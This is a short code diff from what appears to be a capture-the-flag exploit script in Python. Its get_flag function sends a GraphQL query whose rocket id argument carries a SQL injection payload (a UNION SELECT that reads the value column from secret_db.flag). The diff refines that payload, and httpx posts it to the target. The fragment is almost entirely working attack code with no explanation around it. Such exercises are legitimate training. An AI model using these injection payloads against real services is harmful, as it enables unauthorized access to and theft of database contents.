@@ -37,7 +37,7 @@ def list_column_name():
 # list_column_name()
 def get_flag():
     payload = {
-        "query": f"{{ rocket(id: \"0 UNION SELECT 2,value,2,2 FROM flag -- -\") {{ name, country, is_active }} }}"
+        "query": f"{{ rocket(id: \"0 UNION SELECT 2,value,2,2 FROM secret_db.flag limit 1 offset 0-- -\") {{ name, country, is_active }} }}"
     }
     r = httpx.post(url, json=payload)
     return r.text
